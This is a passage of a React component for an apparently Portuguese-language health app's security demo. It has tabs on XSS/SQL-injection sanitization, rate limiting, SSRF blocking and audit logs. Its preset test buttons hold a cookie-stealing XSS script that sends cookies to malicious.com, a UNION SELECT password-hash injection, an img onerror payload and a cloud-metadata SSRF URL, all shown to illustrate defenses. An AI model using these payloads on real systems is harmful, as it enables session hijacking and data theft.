                    <h3 className="text-lg font-black text-slate-900 tracking-tight">Prevenção contra Injeções & XSS</h3>
                  </div>
                  <p className="text-xs text-slate-500 mt-1">
                    Ataques como SQL Injection e Cross-Site Scripting (XSS) tentam injetar scripts maliciosos ou query SQL para roubar dados. Nosso validador intercepta e limpa essas entradas nocivas na fronteira do servidor.
                  </p>
                </div>

                <div className="space-y-4">
                  {/* Preset Injection Payloads */}
                  <div>
                    <span className="text-[10px] font-black uppercase tracking-widest text-slate-400 block mb-1.5">Injetar payloads maliciosos de teste:</span>
                    <div className="flex flex-wrap gap-2">
                      <button 
                        onClick={() => setValidationInput("<script>alert(document.cookie); fetch('http://malicious.com?cookie='+document.cookie)</script>")}
                        className="px-3.5 py-2 bg-red-50 border border-red-100 hover:bg-red-100 text-red-700 rounded-xl text-[10px] font-bold transition-all"
                      >
                        Script XSS Malicioso (Roubo de Session)
                      </button>
                      <button 
                        onClick={() => setValidationInput("Dr. Carlos' UNION SELECT id, password_hash, email FROM users;--")}
                        className="px-3.5 py-2 bg-red-50 border border-red-100 hover:bg-red-100 text-red-700 rounded-xl text-[10px] font-bold transition-all"
                      >
                        SQL Injection (Union Select Passwords)
                      </button>
                      <button 
                        onClick={() => setValidationInput("<img src=x onerror=alert('XSS')>")}
                        className="px-3.5 py-2 bg-red-50 border border-red-100 hover:bg-red-100 text-red-700 rounded-xl text-[10px] font-bold transition-all"
                      >
                        Image Source Error Bypass XSS
                      </button>
                    </div>
                  </div>

                  {/* Sandbox Input Text Area */}
                  <div>
                    <label className="text-[10px] font-black uppercase tracking-wider text-slate-400 block mb-1">Entrada a ser Analisada (Input)</label>
                    <div className="flex gap-2">
                      <input 
                        type="text"
                        placeholder="Digite sua busca ou conteúdo aqui..."
                        value={validationInput}
                        onChange={(e) => setValidationInput(e.target.value)}
                        className="flex-1 bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-xs font-medium focus:ring-2 focus:ring-sky-500/20 text-slate-800"
                      />
                      <button
                        onClick={handleSanitize}
                        disabled={!validationInput.trim()}
                        className="px-5 py-3 bg-slate-900 text-white rounded-xl text-xs font-bold hover:bg-slate-800 transition-all flex items-center gap-1.5 disabled:opacity-50"
                      >
                        <Send size={14} /> Filtrar
                      </button>
                    </div>
                  </div>

                  {/* Result comparison */}
                  {sanitizationResult && (
                    <div className="space-y-4 pt-2">
                      
                      {/* Safety Alerts */}
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                        <div className={`p-3 rounded-xl border flex items-center gap-2.5 text-xs font-bold ${sanitizationResult.xssStatus === 'Clean' ? 'bg-emerald-50 border-emerald-100 text-emerald-800' : 'bg-red-50 border-red-100 text-red-800'}`}>
                          {sanitizationResult.xssStatus === 'Clean' ? <CheckCircle size={16} /> : <AlertTriangle size={16} />}
                          XSS: {sanitizationResult.xssStatus}
                        </div>
                        
                        <div className={`p-3 rounded-xl border flex items-center gap-2.5 text-xs font-bold ${sanitizationResult.sqlStatus === 'Clean' ? 'bg-emerald-50 border-emerald-100 text-emerald-800' : 'bg-red-50 border-red-100 text-red-800'}`}>
                          {sanitizationResult.sqlStatus === 'Clean' ? <CheckCircle size={16} /> : <AlertTriangle size={16} />}
                          SQLi: {sanitizationResult.sqlStatus}
                        </div>
                      </div>

                      {/* Code Output Visual Comparison */}
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        
                        {/* Before */}
                        <div className="bg-red-50/40 p-4 rounded-xl border border-red-100 text-left">
                          <span className="text-[9px] font-black text-red-600 uppercase tracking-widest block mb-1">Entrada Bruta Enviada</span>
                          <pre className="text-xs font-mono text-slate-700 bg-white p-3 rounded-lg border border-slate-100 overflow-x-auto whitespace-pre-wrap select-all">
                            {sanitizationResult.original}
                          </pre>
                        </div>

                        {/* After */}
                        <div className="bg-emerald-50/40 p-4 rounded-xl border border-emerald-100 text-left">
                          <span className="text-[9px] font-black text-emerald-600 uppercase tracking-widest block mb-1">Após Sanitização do Servidor (Seguro para renderizar)</span>
                          <pre className="text-xs font-mono text-slate-700 bg-white p-3 rounded-lg border border-slate-100 overflow-x-auto whitespace-pre-wrap select-all">
                            {sanitizationResult.sanitized}
                          </pre>
                          <p className="text-[9px] text-slate-400 font-bold mt-2 leading-tight">
                            As tags HTML especiais foram devidamente codificadas (escapadas). Desta forma, o navegador renderizará como texto simples e nunca executará scripts no cliente!
                          </p>
                        </div>

                      </div>

                    </div>
                  )}

                </div>
              </motion.div>
            )}

            {/* API PROTECTION TAB */}
            {activeTab === 'api' && (
              <motion.div 
                key="tab-api"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="p-6 text-left space-y-6"
              >
                <div>
                  <div className="flex items-center gap-2">
                    <Globe className="text-sky-500" size={20} />
                    <h3 className="text-lg font-black text-slate-900 tracking-tight">Proteção de APIs: Rate Limiting & Anti-SSRF</h3>
                  </div>
                  <p className="text-xs text-slate-500 mt-1">
                    APIs expostas na nuvem sofrem escaneamento por robôs. Taxas de limite (Rate Limiting) evitam sobrecarga de servidores e ataques de força bruta, enquanto filtros de SSRF previnem invasões de rede corporativa interna.
                  </p>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  
                  {/* Rate Limit Container */}
                  <div className="p-5 bg-slate-50 rounded-2xl border border-slate-200 space-y-4 text-left flex flex-col justify-between">
                    <div>
                      <div className="flex items-center justify-between">
                        <span className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Rate Limiting Simulator</span>
                        <span className="text-[8px] bg-sky-100 text-sky-800 font-black uppercase tracking-wider px-2 py-0.5 rounded">Max: 5 requisições rápidas</span>
                      </div>
                      <h4 className="text-sm font-bold text-slate-950 mt-1.5">Simular Ataque de Força Bruta</h4>
                      <p className="text-[11px] text-slate-500 leading-normal mt-1">
                        Dispare requisições consecutivas para simular um bot tentando forçar logins. O servidor detectará o comportamento anormal e aplicará um bloqueio temporário por IP (HTTP 429).
                      </p>
                    </div>

                    <div className="space-y-3 pt-3">
                      {isRateLimited ? (
                        <div className="bg-red-500/10 border border-red-500/30 p-3.5 rounded-xl text-center space-y-2">
                          <div className="flex items-center justify-center gap-2 text-red-600 font-bold text-xs">
                            <Ban className="animate-pulse" size={16} /> ⚠️ IP BLOQUEADO (Rate Limit Excedido)
                          </div>
                          <p className="text-[10px] text-red-700/80 leading-normal">
                            Aguarde o temporizador expirar para restabelecer a segurança normal da rota.
                          </p>
                          <div className="font-mono font-black text-red-600 text-lg">
                            Liberando em: {rateLimitTimer}s
                          </div>
                        </div>
                      ) : (
                        <div className="space-y-2">
                          <button
                            onClick={handleSimulateBruteForce}
                            className="w-full py-2.5 bg-red-100 hover:bg-red-200 text-red-700 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-2"
                          >
                            <AlertTriangle size={14} /> Disparar Requisição Rápida ({rapidRequestsCount}/5)
                          </button>
                          
                          {/* Visual progress bar of brute force tracker */}
                          <div className="w-full bg-slate-200 h-2 rounded-full overflow-hidden">
                            <div 
                              className={`h-full transition-all duration-300 ${rapidRequestsCount >= 4 ? 'bg-red-500' : rapidRequestsCount >= 2 ? 'bg-amber-500' : 'bg-sky-500'}`}
                              style={{ width: `${(rapidRequestsCount / 5) * 100}%` }}
                            ></div>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* SSRF Protection Container */}
                  <div className="p-5 bg-slate-50 rounded-2xl border border-slate-200 space-y-4 text-left flex flex-col justify-between">
                    <div>
                      <div className="flex items-center justify-between">
                        <span className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Server-Side Request Forgery</span>
                        <span className="text-[8px] bg-emerald-100 text-emerald-800 font-black uppercase tracking-wider px-2 py-0.5 rounded">SSRF Block</span>
                      </div>
                      <h4 className="text-sm font-bold text-slate-950 mt-1.5">Validador de Domínios de Saúde</h4>
                      <p className="text-[11px] text-slate-500 leading-normal mt-1">
                        O SISA possui um proxy de integrações para buscar artigos de portais confiáveis. Tentar forçar o servidor a acessar uma URL interna restrita do cluster resultará em rejeição imediata da requisição.
                      </p>
                    </div>

                    <div className="space-y-3 pt-3">
                      <div>
                        <span className="text-[9px] font-black text-slate-400 block mb-1">Escolher URL para teste:</span>
                        <div className="flex flex-col gap-1.5">
                          <button 
                            onClick={() => setTargetUrl('https://saude.gov.br/v1/diretrizes')}
                            className="text-left text-[10px] text-sky-600 font-bold bg-white p-2 rounded-lg border border-slate-200 hover:bg-slate-50 transition-all flex items-center gap-1"
                          >
                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
                            Portal de Diretrizes Públicas (Seguro)
                          </button>
                          <button 
                            onClick={() => setTargetUrl('http://169.254.169.254/latest/meta-data')}
                            className="text-left text-[10px] text-red-600 font-bold bg-white p-2 rounded-lg border border-slate-200 hover:bg-slate-50 transition-all flex items-center gap-1"
                          >
                            <span className="w-1.5 h-1.5 rounded-full bg-red-500"></span>
                            Metadados de Nuvem Corporativa (Invasão SSRF)
                          </button>
                        </div>
                      </div>

                      <div className="flex gap-2">
                        <input 
                          type="text"
                          value={targetUrl}
                          onChange={(e) => setTargetUrl(e.target.value)}
                          className="flex-1 bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs font-medium focus:ring-2 focus:ring-sky-500/20 text-slate-800"
                        />
                        <button
                          onClick={handleProxyFetch}
                          disabled={ssrfLoading}
                          className="px-4 py-2 bg-slate-900 text-white rounded-xl text-xs font-bold hover:bg-slate-800 transition-all flex items-center justify-center"
                        >
                          {ssrfLoading ? <RefreshCw className="animate-spin" size={12} /> : 'Acessar'}
                        </button>
                      </div>

                      {/* Output status */}
                      {ssrfResult && (
                        <div className="p-3 bg-emerald-50 border border-emerald-100 rounded-xl text-[10px] text-emerald-800 font-bold">
                          ✓ {ssrfResult.status}: Acesso autorizado à URL externa homologada.
                        </div>
                      )}

                      {ssrfError && (
                        <div className="p-3 bg-red-50 border border-red-100 rounded-xl text-[10px] text-red-800 font-medium">
                          ❌ <strong>{ssrfError}</strong>
                        </div>
                      )}

                    </div>
                  </div>

                </div>
              </motion.div>
            )}

            {/* AUDIT LOGS TAB */}
            {activeTab === 'logs' && (
              <motion.div 
                key="tab-logs"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="p-6 text-left space-y-4"
              >
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-100 pb-4">
                  <div>
                    <div className="flex items-center gap-2">
                      <Terminal className="text-sky-500" size={20} />
                      <h3 className="text-lg font-black text-slate-900 tracking-tight">Rastreador de Logs de Auditoria Centralizados</h3>
                    </div>
                    <p className="text-xs text-slate-500 mt-1">
                      Eventos sensíveis, autenticações e tentativas de intrusão são armazenados em um log imutável de segurança.
                    </p>
                  </div>

                  <button
                    onClick={() => fetchLogs()}
                    disabled={logsLoading}
                    className="self-start sm:self-center px-3.5 py-2 bg-slate-100 text-slate-700 hover:bg-slate-200 rounded-xl text-xs font-bold transition-all flex items-center gap-1.5 disabled:opacity-50 flex-none"
                  >
                    <RefreshCw className={logsLoading ? 'animate-spin' : ''} size={14} />
                    Atualizar Logs
                  </button>
                </div>

                {/* Filter Selector */}
                <div className="flex gap-2 border-b border-slate-100 pb-3 overflow-x-auto">
                  {[
                    { id: 'ALL', label: 'Todos' },
                    { id: 'INFO', label: 'INFO' },
                    { id: 'WARNING', label: 'WARNING' },
                    { id: 'CRITICAL', label: 'CRITICAL' }
                  ].map((f) => (
                    <button
                      key={f.id}
                      onClick={() => setLogsFilter(f.id as any)}
                      className={`px-3 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-wider transition-all duration-200 ${logsFilter === f.id ? 'bg-slate-900 text-white' : 'bg-slate-100 text-slate-500 hover:text-slate-800'}`}
                    >
                      {f.label}
                    </button>
                  ))}
                </div>

                {/* DevOps Code Console Visualizer */}
                <div className="bg-slate-950 text-slate-300 rounded-2xl border border-slate-900 font-mono p-4 text-xs shadow-inner overflow-hidden flex flex-col min-h-[300px] max-h-[500px]">
                  
                  {/* Console header */}
                  <div className="flex items-center justify-between border-b border-slate-900 pb-3 mb-3 text-[10px] text-slate-500 font-bold">
                    <span className="flex items-center gap-2">
                      <span className="w-2.5 h-2.5 rounded-full bg-red-500"></span>
                      <span className="w-2.5 h-2.5 rounded-full bg-amber-500"></span>
                      <span className="w-2.5 h-2.5 rounded-full bg-emerald-500"></span>
                      sisa-wellness-audit-stream.log
                    </span>
                    <span className="flex items-center gap-1 bg-slate-900 px-2 py-0.5 rounded border border-slate-800 text-slate-400">
                      <Radio className="text-emerald-500 animate-pulse" size={10} />
                      AUDIT ACTIVE
                    </span>
                  </div>

                  {/* Console body list */}
                  <div className="flex-1 overflow-y-auto space-y-3.5 pr-2 scrollbar-thin scrollbar-thumb-slate-800">
                    {filteredLogs.length === 0 ? (
                      <p className="text-slate-600 italic text-center py-10">Nenhum evento registrado no filtro selecionado.</p>
                    ) : (
                      filteredLogs.map((log) => {
                        const dateStr = new Date(log.timestamp).toLocaleTimeString();
                        const levelColors = {
                          INFO: 'text-sky-400 bg-sky-500/10 border-sky-500/20',
                          WARNING: 'text-amber-400 bg-amber-500/10 border-amber-500/20',
                          CRITICAL: 'text-red-400 bg-red-500/10 border-red-500/20'
                        };
                        
                        return (
                          <div key={log.id} className="text-left leading-relaxed border-b border-slate-900/60 pb-2 last:border-0">
                            <div className="flex flex-wrap items-center gap-1.5 text-[10px]">
                              <span className="text-slate-600 font-black">[{dateStr}]</span>
                              <span className={`px-1.5 py-0.5 rounded text-[8px] font-black border uppercase tracking-wider ${levelColors[log.severity]}`}>
                                {log.severity}
                              </span>
                              <span className="text-slate-500 font-bold uppercase tracking-wider text-[8px] bg-slate-900 px-1.5 py-0.5 rounded border border-slate-800/60">
                                {log.category}
                              </span>
                              <span className="text-slate-400 font-bold text-[9px]">{log.event}</span>
                              <span className="text-slate-600 ml-auto">IP: {log.ip}</span>
                            </div>
                            <p className="text-slate-300 font-medium text-[11px] leading-snug mt-1 pl-1 border-l border-slate-800">
                              {log.details}
                            </p>
                          </div>
                        );
                      })
                    )}
                  </div>

                  {/* Console footer */}
                  <div className="border-t border-slate-900 pt-3 mt-3 text-[9px] text-slate-500 font-bold flex items-center justify-between leading-none">
                    <span>Exibindo {filteredLogs.length} logs de auditoria de segurança</span>
                    <span className="text-slate-600">SISA Secure Engine v1.0 • Node.js Backend</span>
                  </div>

                </div>

              </motion.div>
            )}

          </AnimatePresence>
        </div>

      </main>
    </div>
  );
}
